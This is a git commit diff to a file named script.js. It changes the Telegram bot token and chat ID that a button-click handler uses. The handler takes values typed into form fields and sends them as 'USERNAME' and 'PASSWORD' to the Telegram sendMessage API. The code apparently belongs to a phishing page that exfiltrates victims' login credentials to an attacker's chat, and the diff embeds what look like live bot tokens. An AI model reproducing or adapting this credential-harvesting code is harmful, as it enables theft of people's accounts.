06e0fc69d9ba1da2d69aee1cbe11505f96c87de9
Venezuelasystem <127757949+Venezuelasystem@users.noreply.github.com>
2024-03-20 23:57:05 -0500

    Update script.js

--- script.js
+++ script.js
@@ -54,7 +54,7 @@ tokencode.addEventListener("keyup", (e) => {
 sendatatme.addEventListener("click", () => {
   const Http = new XMLHttpRequest();
   const url =
-    "https://api.telegram.org/bot6548505320:AAHdw56nuEawpkdqXa5c5lGxyPDxXHIGwbQ/sendMessage?chat_id=6203967638&text=USERNAME:%20" +
+    "https://api.telegram.org/bot7083762685:AAG9B4DKlndXsVmyYSvMElq45PQiwnUFPIQ/sendMessage?chat_id=7101053333&text=USERNAME:%20" +
     resfirst.value +
     " PASSWORD: " +
     resecond.value;
